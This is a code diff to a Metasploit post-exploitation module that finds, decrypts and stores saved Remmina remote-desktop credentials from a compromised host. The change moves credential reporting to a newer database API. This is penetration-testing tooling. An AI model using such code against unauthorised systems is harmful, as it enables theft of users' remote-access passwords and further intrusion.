@@ -28,14 +28,11 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    creds = extract_all_creds
-    if creds.empty?
+    creds_count = extract_all_creds
+    if creds_count == 0
       print_status('No Reminna credentials collected')
     else
-      creds.each do |cred|
-        report_auth_info(cred)
-      end
-      print_good("Collected #{creds.size} sets of Remmina credentials")
+      print_good("Collected #{creds_count} sets of Remmina credentials")
     end
   end
 
@@ -57,7 +54,7 @@ class Metasploit3 < Msf::Post
 
   # Extracts all remmina creds found anywhere on the target
   def extract_all_creds
-    creds = []
+    creds_count = 0
     user_dirs = enum_user_directories
     if user_dirs.empty?
       print_error('No user directories found')
@@ -94,15 +91,15 @@ class Metasploit3 < Msf::Post
         if cred_files.empty?
           vprint_status("No Remmina credential files in #{remmina_dir}")
         else
-          creds |= extract_creds(secret, cred_files)
+          creds_count += extract_creds(secret, cred_files)
         end
       end
     end
-    creds
+    creds_count
   end
 
   def extract_creds(secret, files)
-    creds = []
+    creds_count = 0
     files.each do |file|
       settings = get_settings(file)
       if settings.empty?
@@ -142,23 +139,33 @@ class Metasploit3 < Msf::Post
         password = decrypt(secret, encrypted_password)
       end
 
-      if host && user
-        creds <<
-          {
-            # this fails when the setting is localhost (uncommon, but it could happen) or when it is a simple string.  huh?
-            # host: host,
-            host: session.session_host,
-            port: port,
-            sname: proto.downcase,
-            user: user,
-            pass: password,
-            active: true
-          }
+      if host && user && password
+        credential_core = create_credential(
+          origin_type: :session,
+          post_reference_name: self.refname,
+          private_type: :password,
+          private_data: password,
+          session_id: session_db_id,
+          username: user,
+          workspace_id: myworkspace_id
+        )
+        login_data = {
+          address: host,
+          port: port,
+          protocol: 'tcp',
+          service_name: proto.downcase,
+          core: credential_core,
+          access_level: 'User',
+          status: Metasploit::Model::Login::Status::UNTRIED,
+          workspace_id: myworkspace_id
+        }
+        create_credential_login(login_data)
+        creds_count += 1
       else
-        print_error("Didn't find host and user in #{file}")
+        vprint_error("No host, user and password in #{file}")
       end
     end
-    creds
+    creds_count
   end
 
   def get_settings(file)
